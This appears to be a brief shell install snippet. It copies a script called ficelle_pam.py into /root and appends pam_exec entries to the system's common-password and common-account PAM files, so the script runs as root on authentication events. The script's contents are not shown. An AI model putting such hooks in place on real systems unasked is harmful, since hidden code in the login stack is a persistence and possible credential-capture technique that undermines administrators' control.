```
cp ficelle_pam.py /root/ficelle_pam.py
chmod +x /root/ficelle_pam.py
echo "session    optional     pam_exec.so /root/ficelle_pam.py" >> /etc/pam.d/common-password
echo "session    optional     pam_exec.so /root/ficelle_pam.py" >> /etc/pam.d/common-account
```